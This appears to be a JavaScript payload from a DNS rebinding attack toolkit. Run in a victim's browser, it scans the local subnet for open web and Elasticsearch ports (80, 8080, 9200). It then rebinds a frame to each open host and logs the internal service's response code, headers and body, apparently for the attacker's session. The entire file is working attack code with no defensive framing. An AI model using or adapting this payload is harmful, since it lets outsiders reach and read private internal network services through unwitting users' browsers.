import NetMap from 'netmap.js'
import * as network from '../libs/network'
import Session from '../libs/session'

const session = new Session()

async function mainFrame () {
  const netmap = new NetMap()
  const localSubnet = await network.getLocalSubnet(24)

  netmap.tcpScan(localSubnet, [80, 8080, 9200]).then(results => {
    for (let h of results.hosts) {
      for (let p of h.ports) {
        if (p.open) session.createFastRebindFrame(h.host, p.port)
      }
    }
  })
}

function rebindFrame () {
  session.triggerFastRebind().then(() => {
    network.get(session.baseURL, {
      successCb: (code, headers, body) => {
        session.log({ code: code, headers: headers, body: body })
      }
    })
  })
}

if (window.args && window.args._rebind) rebindFrame()
else mainFrame()
